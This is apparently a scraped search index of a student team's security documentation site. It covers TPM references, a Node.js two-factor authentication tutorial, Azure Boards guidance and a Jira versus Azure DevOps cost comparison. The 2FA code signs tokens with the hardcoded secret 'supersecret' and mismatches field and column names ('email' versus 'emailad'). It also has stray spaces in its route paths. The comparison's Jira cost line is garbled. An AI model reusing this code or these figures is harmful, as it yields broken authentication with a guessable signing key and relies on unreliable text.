https://buyzero.de/products/letstrust-hardware-tpm-trusted-platform-module. [Accessed: 20-Aug-2022]. [12] Jan. Cumps, 2021. [Online]. Available: https://community.element14.com/products/roadtest/rt/roadtests/529/infineon_trust_platf#pifragment-4100=4&amp;pifragment-4106=9. [Accessed: 19- Aug- 2022].  [13] “OPTIGATM TPM – security forum,” Infineon.com. [Online]. Available: https://community.infineon.com/t5/OPTIGA-TPM/bd-p/OptigaTPM?_ga=2.209230994.1697558163.1661643991-1488785146.1661643991&amp;intc=CSS_Cmty_Bnr. [Accessed: 20-Aug-2022].  [14] “Infineon trust platform module + raspberry pi 3 B - element14 community,” Element14.com. [Online]. Available: https://community.element14.com/products/roadtest/rt/roadtests/529/infineon_trust_platf. [Accessed: 20-Aug-2022].  [15] Farnell.com. [Online]. Available: https://www.farnell.com/datasheets/2869244.pdf. [Accessed: 23-Aug-2022].  [16] M. Huerrera, &quot;incibe-cert,&quot; 2015. [Online]. Available: https://www.incibe-cert.es/en/blog/tpm-en. [Accessed 13 8 2022].  [17] J. D. Clercq, &quot;Trusted Platform Module (TPM) Key Attestation,&quot; itprotoday, 19 Mar 2015. [Online]. Available: https://www.itprotoday.com/mobile-management-and-security/trusted-platform-module-tpm-key-attestation. [Accessed 22 8 2022].  [18] V. Bael, &quot;TPM,&quot; 2006. [Online]. Available: https://www.webopedia.com/definitions/trusted-platform-module/. [Accessed 13 8 2022].  [19] A. Tomlinson, &quot;Introduction to the TPM,&quot; in Smart Cards, Tokens, Security and Application, Boston, Springer, 2008, pp. 155-167.  [20] B. S. R. M. I. L. Shohreh Hosseinzadeh, &quot;Recent trends in applying TPM to cloud computing,&quot; Cyber Trust research program; DIMECC , Finland, 2019.  [21] M. D. James, &quot;A Reconfigurable Trusted Platform Module,&quot; Brigham Young University, Brigham, 2017.  [22] Dansimp et al., &quot;TPM Fundamentals&quot;, Microsoft Docs, 2022. [Online]. Available: https://docs.microsoft.com/en-us/windows/security/information-protection/tpm/tpm-fundamentals. [Accessed: 23- Aug- 2022].  [23] Trusted Computing Group, &quot;Trusted Platform Module (TPM) Summary&quot;, Trusted Computing Group. [Online]. Available: https://trustedcomputinggroup.org/resource/trusted-platform-module-tpm-summary/. [Accessed: 21- Aug- 2022].  [24] Gilles, &quot;TPM and Remote attestation&quot;, Cryptography Stack Exchange, 2018. [Online]. Available: https://crypto.stackexchange.com/questions/59965/tpm-and-remote-attestation. [Accessed: 22- Aug- 2022].  [25] tomoveu, &quot;tpm.dev.tutorials/Random_Number_Generator/README.md&quot;, GitHub, 2021. [Online]. Available: https://github.com/tpm2dev/tpm.dev.tutorials/blob/master/Random_Number_Generator/README.md. [Accessed: 21- Aug- 2022].  [26] Ebrary.net, &quot;Random Number Generator&quot;, Ebrary.net. [Online]. Available: https://ebrary.net/24721/computer_science/random_number_generator. [Accessed: 21- Aug- 2022].  [27] D. Previtali, &quot;License Management with TPM powered with CodeMeter&quot;, Trusted Computing Group, 2018. [Online]. Available: https://develop.trustedcomputinggroup.org/2018/03/20/license-management-with-tpm-powered-with-codemeter/. [Accessed: 22- Aug- 2022].  [28] IBM, &quot;IBM Documentation&quot;, IBM, 2021. [Online]. Available: https://www.ibm.com/docs/en/power9?topic=POWER9/p9ia9/p9ia9_tpm_event_logs.htm. [Accessed: 21- Aug- 2022].  [29] Dansimp et al., &quot;Understanding PCR banks on TPM 2.0 devices&quot;, Microsoft Docs, 2022. [Online]. Available: https://docs.microsoft.com/en-us/windows/security/information-protection/tpm/switch-pcr-banks-on-tpm-2-0-devices. [Accessed: 21- Aug- 2022].  [30] J. Cumps, &quot;Infineon Trust Platform Module + Raspberry Pi 3 B - Review&quot;, element14, 2021. [Online]. Available: https://community.element14.com/products/roadtest/rv/roadtest_reviews/1514/infineon_trust_platf. [Accessed: 21- Aug- 2022].  [31] B. Parno, &quot;Bootstrapping Trust in a “Trusted” Platform,&quot; Carnegie Mellon University, Pittsburgh, 2018.  [32] D. R. Omar, &quot;How Trusted Platform Module (TPM) Is Used Today,&quot; 2017. [Online]. Available: https://www.linkedin.com/pulse/how-trusted-platform-module-tpm-used-today-sbeit-black-belt/. [Accessed 13 8 2017].  [33] D. GOODIN, &quot;Trusted platform module security defeated in 30 minutes, no soldering required,&quot; 2021. [Online]. Available: https://arstechnica.com/gadgets/2021/08/how-to-go-from-stolen-pc-to-network-intrusion-in-30-minutes/. [Accessed 13 8 2022].  [34] , A. Louca, &quot;TPM Vulnerability: Bitlocker Full Disk Encryption impacted,&quot; 2017. [Online]. Available: https://www.softcat.com/news/tpm-vulnerability-bitlocker-full-disk-encryption-impacted. [Accessed 13 8 2022].  [35] Integration of an OPTIGA™ TPM SLx 9670 TPM2.0 with SPI Interface in a Raspberry Pi® 4 Linux environment. Munich, Germany: Infineon, 2019 [Online]. Available: https://www.infineon.com/dgdl/Infineon-OPTIGA_SLx_9670_TPM_2.0_Pi_4-ApplicationNotes-v07_19-EN.pdf?fileId=5546d4626c1f3dc3016c3d19f43972eb. [Accessed: 20- Aug- 2022]  [36] M. Stanojevic, &quot;TPM 1.2 vs 2.0: Here's everything you need to know&quot;, Windows Report - Error-free Tech Life, 2021. [Online]. Available: https://windowsreport.com/tpm-1-2-vs-2-0/. [Accessed: 20- Aug- 2022]  [37] &quot;LUKS: Disk Encryption&quot;, Guardian Project. [Online]. Available: https://guardianproject.info/archive/luks/. [Accessed: 20- Aug- 2022]  [38] &quot;Trusted Platform Module - ArchWiki&quot;, Wiki.archlinux.org. [Online]. Available: https://wiki.archlinux.org/title/Trusted_Platform_Module. [Accessed: 20- Aug- 2022]  [39] &quot;LUKS on Raspberry Pi&quot;, LUKS-on-Raspberry-Pi, 2021. [Online]. Available: https://rr-developer.github.io/LUKS-on-Raspberry-Pi/. [Accessed: 20- Aug- 2022]  [40] &quot;Raspbian Stretch Luks Encrypt [solved] - Raspberry Pi Forums&quot;, Forums.raspberrypi.com, 2018. [Online]. Available: https://forums.raspberrypi.com/viewtopic.php?t=219867. [Accessed: 20- Aug- 2022] ","version":"Next","tagName":"h2"},{"title":"Two Factor Authentication","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/two-factor-authentication","content":"","keywords":"","version":"Next"},{"title":"Signup​","type":1,"pageTitle":"Two Factor Authentication","url":"/redback-documentation/docs/cybersecurity/research/two-factor-authentication#signup","content":" This part asks the new users to sign-up and become members. Users are asked to enter their email address.  &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Sign Up&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.c ss&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384- 1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container mx-auto mt-4&quot;&gt; &lt;h1&gt;SIGN UP&lt;/h1&gt; &lt;form action=&quot;/signup&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;mb-3&quot;&gt; &lt;label for=&quot;emailad&quot; class=&quot;form-label&quot;&gt;Email&lt;/label&gt; &lt;input type=&quot;emailad&quot; class=&quot;form-control&quot; id=&quot;emailad&quot; name=&quot;emailad&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Sign Up&lt;/button&gt; &lt;/form&gt; &lt;p class=&quot;mt-4&quot;&gt; Have an account? &lt;a href=&quot;/login&quot;&gt;Login&lt;/a&gt; &lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;   The above code would ask user to enter their email address and once its submitted, user will be redirected to authentication page.  ","version":"Next","tagName":"h2"},{"title":"QR Code Generation​","type":1,"pageTitle":"Two Factor Authentication","url":"/redback-documentation/docs/cybersecurity/research/two-factor-authentication#qr-code-generation","content":" In the backend (Node js), a POST route is created to complete registration. Email provided at sign up is retrieved to create the secret phrase that would be used to generate the QR code.  app.post('/signup', (req, res) =&gt; { const emailad = req.body.email, phrase = authenticator.generateSecret() const db = new sqlite3.Database('db.sqlite') db.serialize(() =&gt; { db.run('INSERT INTO `users`(`emailad`, `phrase`) VALUES (?, ?)', [emailad, phrase], (err) =&gt; { if (err) { throw err } QRCode.toDataURL(authenticator.keyuri(emailad, '2FA Node App', phrase), (err, url) =&gt; { if (err) { throw err } req.session.qr = url req.session.email = emailad res.redirect('/ 2FA-Sign') }) }) }) })   A base32 HEX will be generated.  The next step would involve creating a new user in database using the email address and secret phrase. A QR Code would be generated with that info. I used a local database on my local machine for this so excluding that step here as that wont be relevant to Redback website’s scenario. This step would need to be modified based on how MongoDB is setup for Redback.  Below code verifies after the user has scanned the QR Code on their mobile. It asks user to enter the TOTP generated on their authenticator app.  &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Sign Up - Set 2FA&lt;/title&gt; &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.c ss&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384- 1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3&quot; crossorigin=&quot;anonymous&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;container mx-auto mt-4&quot;&gt; &lt;h1&gt;Sign Up &amp; Activate 2FA&lt;/h1&gt; &lt;form action=&quot;/2FA-Sign&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Scan this QR Code in your authenticator app. Once done, enter the passphrase generated in the app on here and click Submit.&lt;/p&gt; &lt;img src=&quot;&lt;%= qr %&gt;&quot; class=&quot;img-fluid&quot; /&gt; &lt;div class=&quot;mb-3&quot;&gt; &lt;label for=&quot;code&quot; class=&quot;form-label&quot;&gt;2FA Code&lt;/label&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;code&quot; name=&quot;code&quot;&gt; &lt;/div&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;   ","version":"Next","tagName":"h2"},{"title":"Authentication​","type":1,"pageTitle":"Two Factor Authentication","url":"/redback-documentation/docs/cybersecurity/research/two-factor-authentication#authentication","content":" In the backend (Node js), following route is created to get the user’s email and TOTP from the session.  app.post('/ 2FA-Sign ', (req, res) =&gt; { if (!req.session.email) { return res.redirect('/') } const emailad = req.session.email, code = req.body.code return Loginverification(emailad, code, req, res, '/ 2FA-Sign') })   The above code calls on routine Loginverification which compares the TOTP and confirms if authentication is successful or not. Below is Loginverification routine’s code .  function Loginverification (emailad, code, req, res, failUrl) { const db = new sqlite3.Database('db.sqlite') db.serialize(() =&gt; { db.get('SELECT phrase FROM users WHERE email = ?', [emailad], (err, row) =&gt; { if (err) { throw err } if (!row) { return res.redirect('/') } if (!authenticator.check(code, row.phrase)) { return res.redirect(failUrl) } req.session.qr = null req.session.email = null req.session.token = jwt.sign(emailad, 'supersecret') return res.redirect('/loggedin') }) }) }  ","version":"Next","tagName":"h2"},{"title":"Best Practice & Usage Guidelines","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines","content":"","keywords":"","version":"Next"},{"title":"6. Best Practices for Using Azure Boards​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#6-best-practices-for-using-azure-boards","content":" To ensure the successful implementation and ongoing use of Azure Boards within the Redback Operations Cyber Security Team, it is essential to follow established best practices. These practices will help each team manage their tasks efficiently, maintain clear communication, and ensure that all projects are completed on time and to a high standard.    ","version":"Next","tagName":"h2"},{"title":"6.1 Structuring Work Items​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#61-structuring-work-items","content":" Work items are the building blocks of Azure Boards, representing tasks, user stories, bugs, and other units of work that need to be tracked and managed. Properly structuring these work items is crucial for maintaining organization and clarity.      ","version":"Next","tagName":"h3"},{"title":"6.2 Task Assignment and Management​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#62-task-assignment-and-management","content":" Efficient task assignment ensures that work is distributed evenly across the team and that each task is handled by the most qualified team member. Proper management of these tasks is essential for maintaining momentum and avoiding bottlenecks.      ","version":"Next","tagName":"h3"},{"title":"6.3 Using Boards and Views Effectively​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#63-using-boards-and-views-effectively","content":" Boards in Azure Boards provide a visual representation of the team's workflow, making it easy to track the progress of tasks and identify any bottlenecks. Configuring these boards to reflect the team's processes is essential for efficient management.      ","version":"Next","tagName":"h3"},{"title":"6.4 Managing Backlogs​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#64-managing-backlogs","content":" The backlog is a key component of Azure Boards, representing a prioritized list of work items that need to be addressed. Effective backlog management ensures that the most important tasks are completed first and that the team is always working on the highest-value activities.      ","version":"Next","tagName":"h3"},{"title":"6.5 Sprint Planning and Execution​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#65-sprint-planning-and-execution","content":" Sprints are time-boxed periods during which specific tasks are completed. Effective sprint planning and execution ensure that the team is focused on achieving clear goals and that progress is made consistently.      ","version":"Next","tagName":"h3"},{"title":"6.6 Utilizing Queries and Dashboards​","type":1,"pageTitle":"Best Practice & Usage Guidelines","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Best Practice & Usage Guidelines#66-utilizing-queries-and-dashboards","content":" Queries and dashboards in Azure Boards provide tools for monitoring team performance, tracking key metrics, and gaining insights into project progress. Proper use of these tools ensures that the team can make informed decisions and identify areas for improvement.     ","version":"Next","tagName":"h3"},{"title":"Azure DevOps Quick Start Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide","content":"","keywords":"","version":"Next"},{"title":"Current Configuration Progress by Team​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#current-configuration-progress-by-team","content":" Done CS - Candice Smith CompletedDone Other - Completed by another team memberOOS - Out of scope T3 2024  ","version":"Next","tagName":"h2"},{"title":"Project 1​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#project-1","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Set up Areas – IoT, VR, WebDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Added “perpetual informational planner items” as WikisDone CS - Added VR Team Work Details Handbook into WikiDone CS - Added Welcome WikiDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Project 2​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#project-2","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Added Welcome WikiDone CS - Added Closed TasksDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Project 3​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#project-3","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Added “perpetual informational planner items” as WikisDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Project 4​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#project-4","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Added “perpetual informational planner items” as WikisDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Project 5​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#project-5","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Added “perpetual informational planner items” as WikisDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Data Warehouse - Jesse​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#data-warehouse---jesse","content":" Done Other - Set up projectDone Other - Allocated Ben Stephens as adminOOS - Added sprints for T1 2025 – Jesse would prefer no sprints so all items can be seen in a unified task viewDone CS - Set Up Boards columnsOOS - Planner Migration (complete - The DW team's planner board is from T2 and can be deleted/wiped. All the required information or tasks that carried over to this trimester have been moved to azure boards.)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Cyber Security - Tristan​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#cyber-security---tristan","content":" Done Other - Set up project - DoneDone Other - Allocated Ben Stephens as admin - DoneDone Other - Added sprints for T1 2025 - DoneDone CS - Set Up Boards columnsCodey to complete: Added “perpetual informational planner items” as WikisCodey to complete: Planner Migration (add planner tasks as user stories with checklist as tasks)Codey to complete: Embed Boards into Teams for T1 2025 instead of Planner.Not Started: GitHub IntegrationNot Started: Set up DashboardNot Started: GitHub to Azure Repos migration  ","version":"Next","tagName":"h3"},{"title":"Web and Mobile Dev​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#web-and-mobile-dev","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS - Planner Migration (add planner tasks as user stories with checklist as tasks)Done CS - Embed Boards into Teams for T1 2025 instead of Planner.Not Started: Set up Dashboard  ","version":"Next","tagName":"h3"},{"title":"Company Leaders​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#company-leaders","content":" Done CS - Set up projectDone CS - Allocated Ben Stephens as adminDone CS - Added sprints for T1 2025Done CS - Set Up Boards columnsDone CS – Used Board  ","version":"Next","tagName":"h3"},{"title":"Start of Trimester 1, 2025​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#start-of-trimester-1-2025","content":" ","version":"Next","tagName":"h2"},{"title":"For Mentors and Team Leaders​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#for-mentors-and-team-leaders","content":" Mentors must be assigned to their Project Teams with at least Basic access.They must assign at least 1 leader in their team with Basic access.View the Welcome Wiki found in “Overview” &gt; “Wiki”.Mentors/Student Leaders must consider whether you want 1 unified team, or separate sub-teams.Go to:      Then assign all Redback Operations students to their respective teams with Stakeholder access. Do this by clicking on the team’s name, then when you are in the team view click “Add”:    *If any of the student leaders need to make changes to project teams, they will need to seek approval from their mentor for basic access.  Area paths have been set up, so team members should only see their own boards.  Any perpetual informational tasks housed within the previous planner have been added to the Team Wiki which can be found within the Project space &gt; Overview &gt; Wiki.  ","version":"Next","tagName":"h3"},{"title":"For Team Members​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#for-team-members","content":" Once you have been granted Stakeholder access to Azure DevOps login and navigate to your team Wiki. This can be found in the left-hand menu under Overview &gt; Wiki.Read the Welcome Wiki understanding that some of this will already have been taken care of by your mentor or team leader.Once you have read through the welcome wiki go to Boards in the Boards menu in the left-hand pane. It's a good idea to review what was completed last trimester and any item sitting open or in the backlog. This may give you an idea of the direction that you may want to take your individual contribution in.  ","version":"Next","tagName":"h3"},{"title":"For Everyone​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#for-everyone","content":" At the start of the trimester once the team have looked over the information from the previous trimester it is a good idea to move any complete items you no longer need to reference into the completed previous trimesters column.  ","version":"Next","tagName":"h3"},{"title":"During T1 2025​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#during-t1-2025","content":" Here are some items you may want to consider moving into Azure DevOps in T1 2025, they were considered out of scope in T3 2024:  Move the OnBoarding process into Azure DevOps.Set up Power BI Integration so teaching team can audit activity utilising BI reportsSet up integration with current GitHub repos so teams can start working natively within Azure DevOps.Consider full migration of your team’s GitHub repo into Azure Repos, this will create much better security around our dev pipelines.  ","version":"Next","tagName":"h2"},{"title":"At the end of T1 2025​","type":1,"pageTitle":"Azure DevOps Quick Start Guide","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Quick Start Guide#at-the-end-of-t1-2025","content":" You may want to set up sprints for the trimester ahead so they can get started quickly.Ensure your board is updated and items are moved through the swim lanes accurately reflecting progress.Update Welcome Wiki with any knew information that may be required following your own contribution to Azure DevOps.You may even want to update this quick start guide for the next cohort to get started quickly in the platform. ","version":"Next","tagName":"h2"},{"title":"Conclusion","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Conclusion","content":"","keywords":"","version":"Next"},{"title":"9. Conclusion​","type":1,"pageTitle":"Conclusion","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Conclusion#9-conclusion","content":" The implementation of Azure Boards within the Redback Operations Cyber Security Team represents a critical step in optimizing project management, enhancing collaboration, and improving task visibility across the organization. By configuring Azure Boards to meet the specific needs of each sub-team, this solution provides a tailored platform for managing workflows, tracking progress, and ensuring alignment with the company's broader cybersecurity goals.  With features like custom boards, sprints, work item templates, and integrations with essential tools such as GitHub, SonarQube, Nagios, and SIEM systems, Azure Boards empowers each team to efficiently manage their tasks, streamline their workflows, and automate critical processes. The platform's ability to track incidents, code reviews, compliance audits, and infrastructure maintenance ensures that all aspects of Redback Operations' cyber security efforts are properly managed and aligned with organizational priorities.  By integrating best practices in task management, reporting, and sprint execution, this solution is expected to lead to increased efficiency, reduced operational risk, and improved collaboration between teams. The successful deployment of this design ensures that the Redback's Cyber Security Team is equipped to handle its responsibilities while maintaining the flexibility to evolve alongside the organization's needs.   ","version":"Next","tagName":"h2"},{"title":"Comparative Analysis of Jira vs. Azure DevOps","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment","content":"","keywords":"","version":"Next"},{"title":"Executive Summary​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#executive-summary","content":" Redback Operations have been utilising GitHub and Microsoft Planner to project manage the work being conducted by their Capstone cohorts each trimester. There are many challenges that go along with this approach; lack of interoperability between the two platforms, lack of functionality and scalability for Microsoft Planner, and GitHub is not the best tool to use for document repository purposes.  In this document we are presenting a comparison of the two systems and making our recommendation on the most suitable path forward, which is implementation of the Azure DevOps Platform. We also provide steps to migration from the current platforms.  ","version":"Next","tagName":"h2"},{"title":"Requirements​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#requirements","content":" ","version":"Next","tagName":"h2"},{"title":"Current Challenges​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#current-challenges","content":" Major security issues around content housed within GitHub and Thingspeak as it is publicly accessible, major risk around API keys, credentials and personal and health information being shared publicly.Disparate environments, Planner does not integrate with developer pipeline so the two are operating in a mutually exclusive way, and there are also other tools being used outside these two main platforms such as Thingspeak, and teams using planner to hold important team information.Planner does not allow for sprint management across Redback Teams.Planner requires a full manual reset and update every trimester and does not handle carry over tasks well.Use of GitHub for documentation including pull request process has proven challenging and time-consuming meaning students are spending more time on upload and less time on contributions.Limited reporting in Planner makes end of unit submissions too manual.Planner has limited customisation.Inefficiencies switching between both platforms to update progress.  ","version":"Next","tagName":"h3"},{"title":"Goals​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#goals","content":" Integrate and unify development pipelines with project management for increased efficiency.Improve the ability to report on contributions for all students through auditing and reporting.Access a more feature rich environment to being to implement new features and tools and elevate student contributions to Redback Operations.Provide a secure and compliant research environment for future Redback Operations cohorts, protected by our Deakin network and credentials.  ","version":"Next","tagName":"h3"},{"title":"Comparison Overview​","type":1,"pageTitle":"Comparative Analysis of Jira vs. Azure DevOps","url":"/redback-documentation/docs/cybersecurity/SecDevOps Team/Azure Boards Project Management/Azure DevOps Comparative Assessment#comparison-overview","content":" Feature\tJira\tAzure DevOpsTask &amp; Project Management\tGood for agile frameworks (Scrum, Kanban). Provides robust tools for issue tracking, workflows, and reporting.\tIntegrated Boards with agile tools, customisable workflows, and strong integration with CI/CD pipelines. Code Repository\tWill rely on integration with external GitHub repositories. Native repo functionality available only in Bitbucket.\tOffers Azure Repos as a built-in Git-based repository or integrates seamlessly with GitHub. Pull Requests\tPull requests managed through GitHub. Tracks them as linked issues.\tNative pull request management within Azure Repos or integrates with GitHub. Document Repository\tNo native document repo; relies on Confluence or external tools like Google Drive or SharePoint.\tSupports document storage as part of Azure Repos or integrated storage in projects. Integrations\tStrong ecosystem with Atlassian tools (Confluence, Bitbucket) and third-party apps.\tTight integration with other Microsoft tools (e.g., Teams, SharePoint, Power BI) and GitHub. Reporting and Analytics\tExcellent reporting with dashboards and 3rd-party apps. Advanced plugins available.\tBuilt-in advanced reporting and analytics tied to pipelines, test plans, and projects. Ease of Use\tStraightforward for agile teams but may require customisation for other workflows.\tFamiliar for organisations already using Microsoft tools; offers streamlined workflows. Scalability\tScales well for project management but depends on integrations for code and CI/CD.\tEnd-to-end solution for project management, repositories, and CI/CD in one platform. Scales well. Cost\tStandard licensing is 7.53peruserpermonth.For100Studentsina12−weektrimesterthattotals7.53 per user per month. For 100 Students in a 12-week trimester that totals 7.53peruserpermonth.For100Studentsina12−weektrimesterthattotals2,259.\tMost students added as Stakeholders which is free. Only Leaders require basic licencing. There are some add-ons to watch out for, but this would be below $1,000. Other\tJira is a widely used platform, offering interaction with an industry standard.\tAzure offers a complete end-to-end solution that in tightly integrated with existing Teams and SharePoint tools.  ","version":"Next","tagName":"h2"},{"title":"Detailed 